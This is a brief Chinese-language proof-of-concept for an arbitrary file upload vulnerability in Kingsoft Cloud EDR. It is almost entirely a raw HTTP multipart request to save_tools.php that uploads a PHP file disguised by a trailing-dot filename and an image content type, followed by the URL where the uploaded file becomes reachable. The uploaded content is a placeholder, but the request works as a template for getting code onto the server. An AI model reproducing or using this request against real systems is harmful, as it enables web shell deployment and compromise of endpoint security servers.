## 金山云EDR任意文件上传漏洞



## poc

```
POST /softmanagement/distribute/save_tools.php HTTP/1.1
Host: *:6868
Content-Length: 582
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykMPE1WkVUSahanwB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarykMPE1WkVUSahanwB
Content-Disposition: form-data; name="toolFile"; filename="2.php."
Content-Type: image/png

1111111
------WebKitFormBoundarykMPE1WkVUSahanwB
Content-Disposition: form-data; name="submit"

æäº¤
------WebKitFormBoundarykMPE1WkVUSahanwB
Content-Disposition: form-data; name="size"

500
------WebKitFormBoundarykMPE1WkVUSahanwB
Content-Disposition: form-data; name="userSession"

1111111
------WebKitFormBoundarykMPE1WkVUSahanwB
Content-Disposition: form-data; name="modeID"

5
------WebKitFormBoundarykMPE1WkVUSahanwB--
```

文件路径

```
http://192.168.37.134:6868/softmanagement/files/2.php
```

